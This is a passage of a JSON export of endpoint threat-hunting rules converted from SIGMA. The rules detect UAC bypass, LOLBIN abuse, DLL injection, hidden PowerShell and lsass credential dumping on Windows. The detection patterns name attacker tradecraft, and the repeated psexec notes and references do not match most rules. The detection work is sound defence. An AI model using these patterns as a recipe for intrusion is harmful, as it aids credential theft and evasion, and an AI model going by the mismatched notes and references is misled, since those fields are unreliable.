                "t1105",
                "t1564"
            ],
            "name": "PrintBrm ZIP Creation of Extraction",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\PrintBrm.exe\" and (tgt.process.cmdline contains \" -f\" and tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 702
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Cabinet File Expansion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\expand.exe\" and (tgt.process.cmdline contains \"-F:\" or tgt.process.cmdline contains \"/F:\" or tgt.process.cmdline contains \"\u2013F:\" or tgt.process.cmdline contains \"\u2014F:\" or tgt.process.cmdline contains \"\u2015F:\")) and ((tgt.process.cmdline contains \":\\Perflogs\\\" or tgt.process.cmdline contains \":\\ProgramData\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\Admin$\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\C$\\\" or tgt.process.cmdline contains \"\\Temporary Internet\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favorites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Favourites\\\") or (tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\Contacts\\\"))) and (not (src.process.image.path=\"C:\\Program Files (x86)\\Dell\\UpdateService\\ServiceShell.exe\" and tgt.process.cmdline contains \"C:\\ProgramData\\Dell\\UpdateService\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 703
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using PkgMgr and DISM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\pkgmgr.exe\" and tgt.process.image.path contains \"\\dism.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 704
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Anydesk Execution From Suspicious Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\AnyDesk.exe\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.publisher=\"AnyDesk Software GmbH\") and (not (tgt.process.image.path contains \"\\AppData\\\" or tgt.process.image.path contains \"Program Files (x86)\\AnyDesk\" or tgt.process.image.path contains \"Program Files\\AnyDesk\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 705
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious powershell execution via a schedule task where the command ends with an suspicious flags to hide the powershell instance instead of executeing scripts or commands. This could be a sign of persistence via PowerShell \"Get-Variable\" technique as seen being used in Colibri Loader",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "Potential Persistence Via Powershell Search Order Hijacking - Task",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\WINDOWS\\System32\\svchost.exe\" and (src.process.cmdline contains \"-k netsvcs\" and src.process.cmdline contains \"-s Schedule\") and (tgt.process.cmdline contains \" -windowstyle hidden\" or tgt.process.cmdline contains \" -w hidden\" or tgt.process.cmdline contains \" -ep bypass\" or tgt.process.cmdline contains \" -noni\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 706
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Visual Basic Command Line Compiler Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\vbc.exe\" and tgt.process.image.path contains \"\\cvtres.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 707
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1140",
                "t1059"
            ],
            "name": "Base64 Encoded PowerShell Command Detected",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"::FromBase64String(\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 708
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an uncommon parent process of \"LINK.EXE\".\nLink.EXE in Microsoft incremental linker. Its a utility usually bundled with Visual Studio installation.\nMultiple utilities often found in the same folder (editbin.exe, dumpbin.exe, lib.exe, etc) have a hardcode call to the \"LINK.EXE\" binary without checking its validity.\nThis would allow an attacker to sideload any binary with the name \"link.exe\" if one of the aforementioned tools get executed from a different location.\nBy filtering the known locations of such utilities we can spot uncommon parent process of LINK.EXE that might be suspicious or malicious.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Link.EXE Parent Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\link.exe\" and tgt.process.cmdline contains \"LINK /\") and (not ((src.process.image.path contains \"C:\\Program Files\\Microsoft Visual Studio\\\" or src.process.image.path contains \"C:\\Program Files (x86)\\Microsoft Visual Studio\\\") and (src.process.image.path contains \"\\VC\\bin\\\" or src.process.image.path contains \"\\VC\\Tools\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 709
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of renamed Remote Utilities (RURAT) via Product PE header field",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Renamed Remote Utilities RAT (RURAT) Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Remote Utilities\" and (not (tgt.process.image.path contains \"\\rutserv.exe\" or tgt.process.image.path contains \"\\rfusclient.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 710
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious ShellExec_RunDLL Call Via Ordinal",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \"SHELL32.DLL\" and (src.process.cmdline contains \"#568\" or src.process.cmdline contains \"#570\" or src.process.cmdline contains \"#572\" or src.process.cmdline contains \"#576\")) and (((src.process.cmdline contains \"comspec\" or src.process.cmdline contains \"iex\" or src.process.cmdline contains \"Invoke-\" or src.process.cmdline contains \"msiexec\" or src.process.cmdline contains \"odbcconf\" or src.process.cmdline contains \"regsvr32\") or (src.process.cmdline contains \"\\Desktop\\\" or src.process.cmdline contains \"\\ProgramData\\\" or src.process.cmdline contains \"\\Temp\\\" or src.process.cmdline contains \"\\Users\\Public\\\")) or (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\msxsl.exe\" or tgt.process.image.path contains \"\\odbcconf.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 711
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect attacker collecting audio via SoundRecorder application.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1123"
            ],
            "name": "Audio Capture via SoundRecorder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SoundRecorder.exe\" and tgt.process.cmdline contains \"/FILE\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 712
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The Devtoolslauncher.exe executes other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Devtoolslauncher.exe Executes Specified Binary",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\devtoolslauncher.exe\" and tgt.process.cmdline contains \"LaunchForDeploy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 713
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects applications trying to modify the registry in order to disable any write-protect property for storage devices.\nThis could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Write Protect For Storage Disabled",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\" and tgt.process.cmdline contains \"Write Protection\" and tgt.process.cmdline contains \"0\" and tgt.process.cmdline contains \"storage\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 714
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055",
                "t1218"
            ],
            "name": "Mavinject Inject DLL Into Running Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" /INJECTRUNNING \" and (not src.process.image.path=\"C:\\Windows\\System32\\AppVClient.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 715
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Calculator Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\calc.exe \" or (tgt.process.image.path contains \"\\calc.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \":\\Windows\\WinSxS\\\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 716
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Use Of The SFTP.EXE Binary As A LOLBIN",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sftp.exe\" and (tgt.process.cmdline contains \" -D ..\" or tgt.process.cmdline contains \" -D C:\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 717
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Potential SysInternals ProcDump Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"copy procdump\" or tgt.process.cmdline contains \"move procdump\") or ((tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \".dmp \") and (tgt.process.cmdline contains \"2.dmp\" or tgt.process.cmdline contains \"lsass\" or tgt.process.cmdline contains \"out.dmp\")) or (tgt.process.cmdline contains \"copy lsass.exe_\" or tgt.process.cmdline contains \"move lsass.exe_\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
